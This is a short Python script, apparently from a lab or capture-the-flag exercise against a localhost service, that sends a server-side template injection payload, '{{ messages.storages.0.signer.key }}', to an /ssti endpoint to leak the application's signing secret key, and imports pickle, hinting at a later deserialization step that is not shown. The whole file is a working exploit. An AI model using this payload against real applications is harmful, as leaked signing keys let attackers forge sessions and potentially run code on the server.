import requests
import pickle

url = "http://localhost:5000/ssti?name={{ messages.storages.0.signer.key }}"
response = requests.get(url)
print(response.text)